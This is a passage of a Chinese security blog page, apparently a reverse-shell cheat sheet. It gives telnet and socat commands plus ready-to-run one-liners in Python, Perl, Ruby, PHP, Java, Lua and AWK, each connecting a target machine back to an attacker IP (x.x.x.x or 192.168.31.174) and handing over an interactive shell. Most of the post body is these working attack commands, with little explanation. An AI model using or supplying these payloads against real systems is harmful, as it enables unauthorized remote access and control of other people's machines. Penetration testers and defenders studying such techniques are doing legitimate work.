+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">nc -lvvp <span class="hljs-number">1234</span><br>nc -lvvp <span class="hljs-number">4321</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>在目标主机上执行：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">telnet 攻击主机ip <span class="hljs-number">1234</span> | /bin/bash | telnet 攻击主机ip <span class="hljs-number">4321</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="socat-反弹"><a href="#socat-反弹" class="headerlink" title="socat 反弹"></a>socat 反弹</h3><p>Socat是Linux 下一个多功能的网络工具，名字来由是” Socket CAT”，因此可以看出它基于socket，能够折腾socket相关的无数事情 ，其功能与netcat类似，不过据说可以看做netcat的加强版,事实上的确也是如此，nc应急比较久没人维护了，确实显得有些陈旧了，我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参加见文末的参考学习。</p>
+<p>有关socat二进制可执行文件，大家可以到这个链接下载：<a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" target="_blank" rel="noopener">https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat</a> </p>
+<ol>
+<li><p>攻击机上开启监听</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">socat TCP-LISTEN:<span class="hljs-number">12345</span> -<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>靶机上运行socat反弹shell</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">/tmp/socat exec:<span class="hljs-string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:<span class="hljs-number">192.168</span><span class="hljs-number">.31</span><span class="hljs-number">.174</span>：<span class="hljs-number">12345</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="常见脚本反弹"><a href="#常见脚本反弹" class="headerlink" title="常见脚本反弹"></a>常见脚本反弹</h3><p><strong>以下脚本是在目标主机上执行，其中 x.x.x.x 均为攻击主机ip，并且需要提前在攻击主机上进行监听相关端口,接下来就不再赘述</strong></p>
+<h4 id="1-python"><a href="#1-python" class="headerlink" title="1. python"></a>1. python</h4><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">python -c 'import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">"x.x.x.x"</span>,<span class="hljs-number">5555</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">"/bin/bash"</span>,<span class="hljs-string">"-i"</span>]);'<br></code></pre></td></tr></table></figure>
+
+<h4 id="2-perl"><a href="#2-perl" class="headerlink" title="2. perl"></a>2. perl</h4><p>方法一：</p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">perl -e 'use Socket;$i=<span class="hljs-string">"x.x.x.x"</span>;$p=<span class="hljs-number">5555</span>;<span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">"tcp"</span>));<span class="hljs-keyword">if</span>(connect(S,sockaddr_in($p,inet_aton($i))))&#123;<span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">"&gt;&amp;S"</span>);<span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">"&gt;&amp;S"</span>);<span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">"&gt;&amp;S"</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">"/bin/sh -i"</span>);&#125;;'<br></code></pre></td></tr></table></figure>
+
+<p>方法二：</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">perl -MIO -<span class="hljs-keyword">e</span> '<span class="hljs-variable">$p</span>=fork;<span class="hljs-keyword">exit</span>,<span class="hljs-keyword">if</span>(<span class="hljs-variable">$p</span>);<span class="hljs-variable">$c</span>=new IO::Socket::INET(PeerAddr,<span class="hljs-string">"x.x.x.x:5555"</span>);STDIN-&gt;fdopen(<span class="hljs-variable">$c</span>,r);$~-&gt;fdopen(<span class="hljs-variable">$c</span>,w);system<span class="hljs-variable">$_</span> <span class="hljs-keyword">while</span>&lt;&gt;;'<br></code></pre></td></tr></table></figure>
+
+<h4 id="3-Ruby"><a href="#3-Ruby" class="headerlink" title="3. Ruby"></a>3. Ruby</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">ruby -rsocket -e 'exit <span class="hljs-keyword">if</span> fork;c=<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TCPSocket</span>.</span></span><span class="hljs-keyword">new</span>(<span class="hljs-string">"x.x.x.x"</span>,<span class="hljs-string">"5555"</span>);<span class="hljs-keyword">while</span>(cmd=c.gets);<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">IO</span>.</span></span>popen(cmd,<span class="hljs-string">"r"</span>)&#123;<span class="hljs-pattern-match">|io|c.print io.read&#125;<span class="hljs-keyword">end</span>'</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="4-PHP"><a href="#4-PHP" class="headerlink" title="4. PHP"></a>4. PHP</h4><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">php -r '$sock=fsockopen(<span class="hljs-string">"x.x.x.x"</span>,<span class="hljs-number">5555</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">"/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);'<br></code></pre></td></tr></table></figure>
+
+<h4 id="5-Java"><a href="#5-Java" class="headerlink" title="5. Java"></a>5. Java</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Revs</span> &#123;</span><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">    * @param args</span><br><span class="hljs-comment">    * @throws Exception </span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">String</span>[] args)</span> throws Exception </span>&#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        Runtime r = Runtime.getRuntime();<br>        <span class="hljs-keyword">String</span> cmd[]= &#123;<span class="hljs-string">"/bin/bash"</span>,<span class="hljs-string">"-c"</span>,<span class="hljs-string">"exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;;<br>        <span class="hljs-built_in">Process</span> p = r.exec(cmd);<br>        p.waitFor();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="6-Lua"><a href="#6-Lua" class="headerlink" title="6. Lua"></a>6. Lua</h4><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">lua -e "require(<span class="hljs-string">'socket'</span>);require(<span class="hljs-string">'os'</span>);t=socket.tcp();t:connect(<span class="hljs-string">'x.x.x.x'</span>,<span class="hljs-string">'5555'</span>);os.execute(<span class="hljs-string">'/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3'</span>);"<br></code></pre></td></tr></table></figure>
+
+<h4 id="7-AWK-反弹"><a href="#7-AWK-反弹" class="headerlink" title="7. AWK 反弹"></a>7. AWK 反弹</h4><p>攻击的机器监听，在收到shell的时候不可以输入enter，不然会断开</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">awk '<span class="hljs-type">BEGIN</span>&#123;s=<span class="hljs-string">"/inet/tcp/0/x.x.x.x/8080"</span>;<span class="hljs-keyword">for</span>(;s|&amp;getline <span class="hljs-built_in">c</span>;close(<span class="hljs-built_in">c</span>))<span class="hljs-keyword">while</span>(<span class="hljs-built_in">c</span>|getline)<span class="hljs-built_in">print</span>|&amp;s;close(s)&#125;'<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/security/" class="category-chain-item">security</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/security/" class="print-no-link">#security</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>漏洞之 reverse shell (反弹 shell)</div>
+      <div>https://flepeng.github.io/081-security-漏洞-漏洞之-reverse-shell-反弹-shell/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Lepeng</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2021年3月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/081-security-%E6%BC%8F%E6%B4%9E-%E6%BC%8F%E6%B4%9E%E4%B9%8B-SQL-Injection%EF%BC%88SQL-%E6%B3%A8%E5%85%A5%EF%BC%89/" title="漏洞之 SQL Injection（SQL 注入）">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">漏洞之 SQL Injection（SQL 注入）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/081-security-%E6%BC%8F%E6%B4%9E-%E6%BC%8F%E6%B4%9E%E4%B9%8B-shellshock-%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E/" title="漏洞之 shellshock (破壳漏洞)">
+                        <span class="hidden-mobile">漏洞之 shellshock (破壳漏洞)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"flepeng/hexo-blog-comment","repo-id":"R_kgDOL0qaig","category":"Announcements","category-id":"DIC_kwDOL0qais4CfBIv","theme-light":"light","theme-dark":"dark","mapping":"pathname","reactions-enabled":1,"emit-metadata":0,"input-position":"top","lang":"zh-CN"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+</html>
